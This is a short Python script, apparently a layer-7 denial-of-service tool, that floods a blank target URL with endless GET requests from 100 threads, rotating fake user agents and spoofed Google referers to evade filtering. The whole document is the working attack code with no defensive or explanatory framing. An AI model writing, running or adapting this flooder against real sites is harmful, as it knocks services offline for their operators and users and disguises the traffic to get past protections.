import requests
import threading
import random
import time
from fake_useragent import UserAgent

target_url = ""  # target 
ua = UserAgent()

headers_list = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Connection: keep-alive"
]

def generate_headers():
    return {
        "User-Agent": ua.random,
        "Accept": random.choice(headers_list),
        "Referer": f"http://google.com?q={random.randint(1,1000)}"
    }   

def attack():
    while True:
        try:
            response = requests.get(target_url, headers=generate_headers(), timeout=2)
            print(f"Sent request | Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("Connection failed")


thread_count = 100 # More threads = more load
for _ in range(thread_count):
    thread = threading.Thread(target=attack)
    thread.start()
